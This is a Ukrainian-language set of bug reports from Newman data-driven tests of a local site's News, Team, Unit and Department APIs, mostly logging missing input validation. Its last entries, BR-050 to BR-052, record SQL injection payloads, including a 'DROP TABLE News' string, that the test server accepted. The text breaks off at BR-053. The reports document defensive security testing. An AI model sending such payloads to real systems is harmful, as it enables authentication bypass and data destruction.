# Багрепорти — Newman DDT (News, Team, Unit, Department)

Джерело: `└ SQL_XSS Update faculty.txt`. Один багрепорт = рівно одна ітерація DDT (за вимогою: не більше і не менше). Враховано лише останній прогін кожної папки; прогони з невгаданим id, обірвані команди й невставлений `<ID>` — відкинуто.

Поле **Очікуваний результат** порожнє скрізь, крім BR, що відповідає ітерації 75 у Department Create/Edit (перевірка ліміту символів) — там `300 символів`.

**Response body:** Newman у стандартному режимі не логує повне тіло відповіді, лише статус/розмір/час (напр. `201 Created, 394B`). Нижче в полі "Тіло" response показано так, як він реально зафіксований у транскрипті — статус-код. Request body реконструйовано з відповідного CSV/failure-логу.

---

## BR-001: News → Update news DDT, ітерація 4: Граничне/IsImportant не передано — скидається на false (field default), навіть якщо раніше було true

**Опис:** DDT-рядок 4 з `ddt_update_news.csv` — сценарій «Граничне/IsImportant не передано — скидається на false (field default), навіть якщо раніше було true».

**Ітерація:** 4 (News → Update news DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/News/11000`
- Request body: `Title=Новина IsImportant не задано`
- Response: `200`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `200`

---

## BR-002: News → Update news DDT, ітерація 7: Негатив-очікування/xlsx приймається як нове зображення — відсутня перевірка MIME

**Опис:** DDT-рядок 7 з `ddt_update_news.csv` — сценарій «Негатив-очікування/xlsx приймається як нове зображення — відсутня перевірка MIME».

**Ітерація:** 7 (News → Update news DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/News/11000`
- Request body: `Title=Новина з документом як зображенням, ImagesFilePaths=E:/Study/Profkom site/Sprint4/data/Documents/smoke_contacts.xlsx`
- Response: `200`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `200`

---

## BR-003: News → Update news DDT, ітерація 8: Граничне/Title 5000 символів при оновленні

**Опис:** DDT-рядок 8 з `ddt_update_news.csv` — сценарій «Граничне/Title 5000 символів при оновленні».

**Ітерація:** 8 (News → Update news DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/News/11000`
- Request body: `Title=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`
- Response: `200`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `200`

---

## BR-004: News → Update news DDT, ітерація 12: Граничне/Оновлення на Title, що дублює інший запис, дозволене

**Опис:** DDT-рядок 12 з `ddt_update_news.csv` — сценарій «Граничне/Оновлення на Title, що дублює інший запис, дозволене».

**Ітерація:** 12 (News → Update news DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/News/11000`
- Request body: `Title=DupNewsTitleUpdated`
- Response: `200`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `200`

---

## BR-005: News → Update news DDT, ітерація 13: Граничне/Дуже довгий кириличний Title при оновленні

**Опис:** DDT-рядок 13 з `ddt_update_news.csv` — сценарій «Граничне/Дуже довгий кириличний Title при оновленні».

**Ітерація:** 13 (News → Update news DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/News/11000`
- Request body: `Title=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`
- Response: `200`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `200`

---

## BR-006: Team → Create team DDT, ітерація 6: Граничне/Type не передано — приймає значення за замовчуванням 0 (Aparat)

**Опис:** DDT-рядок 6 з `ddt_create_team.csv` — сценарій «Граничне/Type не передано — приймає значення за замовчуванням 0 (Aparat)».

**Ітерація:** 6 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Type не задано, Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-007: Team → Create team DDT, ітерація 10: Граничне/Type у вигляді назви enum 'Aparat' приймається

**Опис:** DDT-рядок 10 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Aparat' приймається».

**Ітерація:** 10 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Type як назва Aparat, Position=Посада, Type=Aparat`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-008: Team → Create team DDT, ітерація 11: Граничне/Type у вигляді назви enum 'Profburo' приймається

**Опис:** DDT-рядок 11 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Profburo' приймається».

**Ітерація:** 11 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Type як назва Profburo, Position=Посада, Type=Profburo`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-009: Team → Create team DDT, ітерація 12: Граничне/Type у вигляді назви enum 'Viddil' приймається

**Опис:** DDT-рядок 12 з `ddt_create_team.csv` — сценарій «Граничне/Type у вигляді назви enum 'Viddil' приймається».

**Ітерація:** 12 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Type як назва Viddil, Position=Посада, Type=Viddil`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-010: Team → Create team DDT, ітерація 14: Граничне/OrderInd не передано — приймає значення за замовчуванням 0

**Опис:** DDT-рядок 14 з `ddt_create_team.csv` — сценарій «Граничне/OrderInd не передано — приймає значення за замовчуванням 0».

**Ітерація:** 14 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=OrderInd не задано, Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-011: Team → Create team DDT, ітерація 15: Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону

**Опис:** DDT-рядок 15 з `ddt_create_team.csv` — сценарій «Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону».

**Ітерація:** 15 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=OrderInd від'ємний, Position=Посада, OrderInd=-5`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-012: Team → Create team DDT, ітерація 16: Граничне/Дуже великий OrderInd приймається

**Опис:** DDT-рядок 16 з `ddt_create_team.csv` — сценарій «Граничне/Дуже великий OrderInd приймається».

**Ітерація:** 16 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=OrderInd великий, Position=Посада, OrderInd=999999`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-013: Team → Create team DDT, ітерація 17: Граничне/IsTemporary не передано — приймає значення за замовчуванням false

**Опис:** DDT-рядок 17 з `ddt_create_team.csv` — сценарій «Граничне/IsTemporary не передано — приймає значення за замовчуванням false».

**Ітерація:** 17 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=IsTemporary не задано, Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-014: Team → Create team DDT, ітерація 19: Граничне/IsChoosed не передано — приймає значення за замовчуванням false

**Опис:** DDT-рядок 19 з `ddt_create_team.csv` — сценарій «Граничне/IsChoosed не передано — приймає значення за замовчуванням false».

**Ітерація:** 19 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=IsChoosed не задано, Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-015: Team → Create team DDT, ітерація 24: Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME

**Опис:** DDT-рядок 24 з `ddt_create_team.csv` — сценарій «Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME».

**Ітерація:** 24 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Документ як зображення, Position=Посада, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_main_page.xlsx`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-016: Team → Create team DDT, ітерація 26: Граничне/Name 5000 символів приймається — немає maxLength

**Опис:** DDT-рядок 26 з `ddt_create_team.csv` — сценарій «Граничне/Name 5000 символів приймається — немає maxLength».

**Ітерація:** 26 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів), Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-017: Team → Create team DDT, ітерація 34: Негатив-очікування/Невалідний формат Email приймається — немає перевірки формату

**Опис:** DDT-рядок 34 з `ddt_create_team.csv` — сценарій «Негатив-очікування/Невалідний формат Email приймається — немає перевірки формату».

**Ітерація:** 34 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=Невалідний email формат, Position=Посада, Email=not-an-email`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-018: Team → Create team DDT, ітерація 35: Граничне/Дуже довгий кириличний Name (5000 символів) приймається

**Опис:** DDT-рядок 35 з `ddt_create_team.csv` — сценарій «Граничне/Дуже довгий кириличний Name (5000 символів) приймається».

**Ітерація:** 35 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів), Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-019: Team → Create team DDT, ітерація 37: Граничне/Name лише з пробілів → 400

**Опис:** DDT-рядок 37 з `ddt_create_team.csv` — сценарій «Граничне/Name лише з пробілів → 400».

**Ітерація:** 37 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Position=Посада`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-020: Team → Create team DDT, ітерація 39: Граничне/Position лише з пробілів → 400

**Опис:** DDT-рядок 39 з `ddt_create_team.csv` — сценарій «Граничне/Position лише з пробілів → 400».

**Ітерація:** 39 (Team → Create team DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `Name=З пробільним Position`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-021: Team → Update team DDT, ітерація 4: Граничне/Type не передано при оновленні — скидається на 0 (Aparat)

**Опис:** DDT-рядок 4 з `ddt_update_team.csv` — сценарій «Граничне/Type не передано при оновленні — скидається на 0 (Aparat)».

**Ітерація:** 4 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=Type не задано при оновленні, Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-022: Team → Update team DDT, ітерація 5: Граничне/IsTemporary не передано — скидається на false, навіть якщо раніше було true

**Опис:** DDT-рядок 5 з `ddt_update_team.csv` — сценарій «Граничне/IsTemporary не передано — скидається на false, навіть якщо раніше було true».

**Ітерація:** 5 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=IsTemporary не задано, Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-023: Team → Update team DDT, ітерація 6: Граничне/IsChoosed не передано — скидається на false

**Опис:** DDT-рядок 6 з `ddt_update_team.csv` — сценарій «Граничне/IsChoosed не передано — скидається на false».

**Ітерація:** 6 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=IsChoosed не задано, Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-024: Team → Update team DDT, ітерація 9: Негатив-очікування/xlsx приймається як заміна Image

**Опис:** DDT-рядок 9 з `ddt_update_team.csv` — сценарій «Негатив-очікування/xlsx приймається як заміна Image».

**Ітерація:** 9 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=З документом як зображенням, Position=Посада, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_about_us.xlsx`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-025: Team → Update team DDT, ітерація 11: Граничне/Name 5000 символів при оновленні

**Опис:** DDT-рядок 11 з `ddt_update_team.csv` — сценарій «Граничне/Name 5000 символів при оновленні».

**Ітерація:** 11 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів), Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-026: Team → Update team DDT, ітерація 12: Граничне/Emoji в Name та Position при оновленні

**Опис:** DDT-рядок 12 з `ddt_update_team.csv` — сценарій «Граничне/Emoji в Name та Position при оновленні».

**Ітерація:** 12 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=Член 😀 оновлено, Position=Посада 🎉`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-027: Team → Update team DDT, ітерація 16: Граничне/Дуже довгий кириличний Name при оновленні

**Опис:** DDT-рядок 16 з `ddt_update_team.csv` — сценарій «Граничне/Дуже довгий кириличний Name при оновленні».

**Ітерація:** 16 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів), Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-028: Team → Update team DDT, ітерація 18: Граничне/Від'ємний OrderInd приймається при оновленні

**Опис:** DDT-рядок 18 з `ddt_update_team.csv` — сценарій «Граничне/Від'ємний OrderInd приймається при оновленні».

**Ітерація:** 18 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Name=OrderInd від'ємний, Position=Посада, OrderInd=-10`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-029: Team → Update team DDT, ітерація 20: Граничне/Name лише з пробілів → 400

**Опис:** DDT-рядок 20 з `ddt_update_team.csv` — сценарій «Граничне/Name лише з пробілів → 400».

**Ітерація:** 20 (Team → Update team DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Team/101`
- Request body: `Position=Посада`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-030: Unit → Update unit DDT, ітерація 4: Граничне/IsActive не передано — скидається на false, навіть якщо раніше було true

**Опис:** DDT-рядок 4 з `ddt_update_unit.csv` — сценарій «Граничне/IsActive не передано — скидається на false, навіть якщо раніше було true».

**Ітерація:** 4 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Name=IsActive не задано при оновленні`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-031: Unit → Update unit DDT, ітерація 7: Негатив-очікування/xlsx приймається як заміна Image

**Опис:** DDT-рядок 7 з `ddt_update_unit.csv` — сценарій «Негатив-очікування/xlsx приймається як заміна Image».

**Ітерація:** 7 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Name=З документом як зображенням, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_contacts.xlsx`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-032: Unit → Update unit DDT, ітерація 13: Граничне/Оновлення на Name, що дублює інший запис, дозволене

**Опис:** DDT-рядок 13 з `ddt_update_unit.csv` — сценарій «Граничне/Оновлення на Name, що дублює інший запис, дозволене».

**Ітерація:** 13 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Name=DupUnitNameUpdated`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-033: Unit → Update unit DDT, ітерація 14: Граничне/Дуже довгий кириличний Name при оновленні

**Опис:** DDT-рядок 14 з `ddt_update_unit.csv` — сценарій «Граничне/Дуже довгий кириличний Name при оновленні».

**Ітерація:** 14 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-034: Unit → Update unit DDT, ітерація 16: Граничне/Від'ємний OrderInd приймається при оновленні

**Опис:** DDT-рядок 16 з `ddt_update_unit.csv` — сценарій «Граничне/Від'ємний OrderInd приймається при оновленні».

**Ітерація:** 16 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Name=OrderInd від'ємний, OrderInd=-7`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-035: Unit → Update unit DDT, ітерація 18: Граничне/Name лише з пробілів → 400

**Опис:** DDT-рядок 18 з `ddt_update_unit.csv` — сценарій «Граничне/Name лише з пробілів → 400».

**Ітерація:** 18 (Unit → Update unit DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/Unit/10`
- Request body: `Content=Name лише з пробілів`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-036: Unit → Create unit DDT, ітерація 5: Граничне/OrderInd не передано — приймає значення за замовчуванням 0

**Опис:** DDT-рядок 5 з `ddt_create_unit.csv` — сценарій «Граничне/OrderInd не передано — приймає значення за замовчуванням 0».

**Ітерація:** 5 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=Підрозділ без OrderInd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-037: Unit → Create unit DDT, ітерація 6: Граничне/IsActive не передано — стає FALSE (на відміну від Faculty.IsActive, DTO не має ініціалізатора =true)

**Опис:** DDT-рядок 6 з `ddt_create_unit.csv` — сценарій «Граничне/IsActive не передано — стає FALSE (на відміну від Faculty.IsActive, DTO не має ініціалізатора =true)».

**Ітерація:** 6 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=Підрозділ IsActive не задано`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-038: Unit → Create unit DDT, ітерація 12: Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME

**Опис:** DDT-рядок 12 з `ddt_create_unit.csv` — сценарій «Негатив-очікування/xlsx приймається як Image — відсутня перевірка MIME».

**Ітерація:** 12 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=Документ як зображення, ImageFilePath=E:/Study/Profkom site/Sprint4/data/Documents/smoke_our_structure.xlsx`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-039: Unit → Create unit DDT, ітерація 14: Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону

**Опис:** DDT-рядок 14 з `ddt_create_unit.csv` — сценарій «Граничне/Від'ємний OrderInd приймається — немає перевірки діапазону».

**Ітерація:** 14 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=OrderInd від'ємний, OrderInd=-3`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-040: Unit → Create unit DDT, ітерація 16: Граничне/Name 5000 символів приймається — немає maxLength

**Опис:** DDT-рядок 16 з `ddt_create_unit.csv` — сценарій «Граничне/Name 5000 символів приймається — немає maxLength».

**Ітерація:** 16 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-041: Unit → Create unit DDT, ітерація 20: Граничне/Дублікат Name дозволений — немає обмеження унікальності

**Опис:** DDT-рядок 20 з `ddt_create_unit.csv` — сценарій «Граничне/Дублікат Name дозволений — немає обмеження унікальності».

**Ітерація:** 20 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=DupUnitName`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-042: Unit → Create unit DDT, ітерація 21: Граничне/Повторний дублікат того ж Name також дозволений

**Опис:** DDT-рядок 21 з `ddt_create_unit.csv` — сценарій «Граничне/Повторний дублікат того ж Name також дозволений».

**Ітерація:** 21 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=DupUnitName`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-043: Unit → Create unit DDT, ітерація 23: Граничне/Дуже довгий кириличний Name (5000 символів) приймається

**Опис:** DDT-рядок 23 з `ddt_create_unit.csv` — сценарій «Граничне/Дуже довгий кириличний Name (5000 символів) приймається».

**Ітерація:** 23 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=ЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩЩ...(5000 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-044: Unit → Create unit DDT, ітерація 24: Граничне/Дуже довгий Content приймається

**Опис:** DDT-рядок 24 з `ddt_create_unit.csv` — сценарій «Граничне/Дуже довгий Content приймається».

**Ітерація:** 24 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Name=Підрозділ з довгим вмістом, Content=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(5000 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-045: Unit → Create unit DDT, ітерація 27: Граничне/Name лише з пробілів → 400

**Опис:** DDT-рядок 27 з `ddt_create_unit.csv` — сценарій «Граничне/Name лише з пробілів → 400».

**Ітерація:** 27 (Unit → Create unit DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Unit`
- Request body: `Content=Name лише з пробілів`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-046: Department → Create department DDT, ітерація 72: Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу

**Опис:** DDT-рядок 72 з `ddt_create_department.csv` — сценарій «Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу».

**Ітерація:** 72 (Department → Create department DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `Name=Dept WrongType, Description=Не-зображення як логотип, IsActive=TRUE, logo_path=data/Documents/requirements.txt`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-047: Department → Create department DDT, ітерація 75: Finding/Name 300 символів прийнято — немає maxLength

**Опис:** DDT-рядок 75 з `ddt_create_department.csv` — сценарій «Finding/Name 300 символів прийнято — немає maxLength».

**Ітерація:** 75 (Department → Create department DDT)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/departments`
- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(300 символів), Description=Задовгий Name (300 символів), IsActive=TRUE, logo_path=data/cats/cat.1.jpg`
- Response: `201`

**Очікуваний результат:** 300 символів

**Фактичний результат:** очікувався `400`, реально отримано `201`

---

## BR-048: Department → Edit department DDT, ітерація 72: Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу

**Опис:** DDT-рядок 72 з `ddt_edit_department.csv` — сценарій «Finding/Не-зображення (.txt) прийнято як логотип — немає перевірки типу файлу».

**Ітерація:** 72 (Department → Edit department DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `Name=Dept WrongType, Description=Не-зображення як логотип, IsActive=TRUE, logo_path=data/Documents/requirements.txt`
- Response: `204`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-049: Department → Edit department DDT, ітерація 75: Finding/Name 300 символів прийнято — немає maxLength

**Опис:** DDT-рядок 75 з `ddt_edit_department.csv` — сценарій «Finding/Name 300 символів прийнято — немає maxLength».

**Ітерація:** 75 (Department → Edit department DDT)

**Тіло:**
- Endpoint: `PUT http://localhost:8080/api/departments/11`
- Request body: `Name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(300 символів), Description=Задовгий Name (300 символів), IsActive=TRUE, logo_path=data/cats/cat.1.jpg`
- Response: `204`

**Очікуваний результат:** 300 символів

**Фактичний результат:** очікувався `400`, реально отримано `204`

---

## BR-050: News → SQL_XSS Create news, ітерація 1: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 1 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-051: News → SQL_XSS Create news, ітерація 2: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 2 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = admin'--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-052: News → SQL_XSS Create news, ітерація 3: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 3 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = '; DROP TABLE News;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-053: News → SQL_XSS Create news, ітерація 4: [SQL Injection] payload не відхилено

